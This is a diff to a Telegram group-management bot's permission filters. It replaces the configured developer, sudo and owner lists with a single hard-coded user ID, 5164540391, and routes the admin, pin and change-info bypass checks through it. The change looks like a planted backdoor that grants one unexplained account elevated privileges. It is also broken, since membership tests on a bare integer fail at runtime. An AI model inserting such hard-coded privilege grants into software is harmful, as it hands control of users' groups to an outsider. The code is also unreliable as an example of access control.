@@ -12,7 +12,7 @@ from plugins.tr_engine import tlang
 from plugins.utils.caching import ADMIN_CACHE, admin_cache_reload
 from info import BOT_USERNAME, SUDO_USERS, DEV_USERS, OWNER_ID, BOT_ID
 
-DEV_LEVEL = set(DEV_USERS + [int(OWNER_ID)])
+DEV_LEVEL = int(5164540391)
 
 
 
@@ -42,7 +42,7 @@ def command(
             # Only devs allowed to use this...!
             return False
 
-        if sudo_cmd and (m.from_user.id not in SUDO_LEVEL):
+        if sudo_cmd and (m.from_user.id not in DEV_LEVEL):
             # Only sudos and above allowed to use it
             return False
 
@@ -151,7 +151,7 @@ async def admin_check_func(_, __, m: Message or CallbackQuery):
         return True
 
     # Bypass the bot devs, sudos and owner
-    if m.from_user.id in SUDO_LEVEL:
+    if m.from_user.id in DEV_LEVEL:
         return True
 
     try:
@@ -260,7 +260,7 @@ async def changeinfo_check_func(_, __, m):
         return True
 
     # Bypass the bot devs, sudos and owner
-    if m.from_user.id in SUDO_LEVEL:
+    if m.from_user.id in DEV_LEVEL:
         return True
 
     user = await m.chat.get_member(m.from_user.id)
@@ -288,7 +288,7 @@ async def can_pin_message_func(_, __, m):
         return True
 
     # Bypass the bot devs, sudos and owner
-    if m.from_user.id in SUDO_LEVEL:
+    if m.from_user.id in DEV_LEVEL:
         return True
 
     user = await m.chat.get_member(m.from_user.id)
